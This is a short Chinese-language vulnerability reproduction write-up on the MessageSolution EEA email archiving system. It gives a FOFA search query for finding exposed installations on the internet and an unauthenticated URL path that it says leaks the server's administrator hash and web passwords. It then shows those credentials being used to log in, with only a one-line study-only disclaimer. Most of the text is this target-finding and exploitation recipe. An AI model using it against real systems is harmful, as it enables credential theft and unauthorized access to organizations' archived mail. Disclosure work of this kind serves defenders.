  

## **一、漏洞描述**

MessageSolution企业邮件归档管理系统
EEA是北京易讯思达科技开发有限公司开发的一款邮件归档系统。该系统存在通用WEB信息泄漏，泄露Windows服务器administrator
hash与web账号密码。

##  **二、漏洞影响**

MessageSolution 企业邮件归档管理系统EEA

##  **三、漏洞复现**

使用FOFA语句包含关键字查找FOFA语句（仅供学习参考，请勿非法利用）

> 1\. title="MessageSolution Enterprise Email Archiving (EEA)"

登录页面如下

![1616416308_60588e34be52958da751d.png!small?1616416308594](https://image.3001.net/images/20210322/1616416308_60588e34be52958da751d.png!small?1616416308594)

访问如下Url

> 1.http://xxx.xxx.xxx.xxx/authenticationserverservlet/

![1616416851_60589053a01d165e0129b.png!small?1616416851353](https://image.3001.net/images/20210322/1616416851_60589053a01d165e0129b.png!small?1616416851353)

使用获得到的密码可以登录系统

![1616419039_605898dfe92904ad308a9.png!small?1616419040263](https://image.3001.net/images/20210322/1616419039_605898dfe92904ad308a9.png!small?1616419040263)

